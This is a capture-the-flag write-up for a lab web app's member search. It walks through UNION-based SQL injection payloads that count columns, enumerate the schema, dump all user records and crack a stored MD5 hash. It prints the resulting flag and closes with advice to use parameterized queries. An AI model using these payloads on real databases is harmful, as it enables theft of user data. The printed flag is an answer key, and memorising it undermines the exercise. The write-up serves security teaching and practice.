# SQL INJECTION

## The flag

```
THE FLAG IS : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## How to find it ?

On the page http://10.12.1.121/index.php?page=member

The search member form may reach an SQL request that looks like this :
SELECT last_name, first_name FROM Users WHERE Id=

- To get the request columns number
1 OR 1=1 UNION SELECT NULL--
-> error
1 OR 1=1 UNION SELECT NULL, NULL--
-> good so 2 columns

- To get the users columns names
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
-> user_id, first_name, last_name, town, country, planet, Commentaire, countersign

- To see all user's data
1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
-> user_id = 5
-> FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28

- Finally "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
md5_decrypt('5ff9d0165b4f92b14994e5c685cdce28')
-> FortyTwo
lower('FortyTwo')
-> fortytwo
sh256('fortytwo')
-> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5


## How to use it ?

Dumb and get all database infos


## How to avoid it ?

Always use parameterized statements in SQL request. If you can't, you must at least escaping inputs.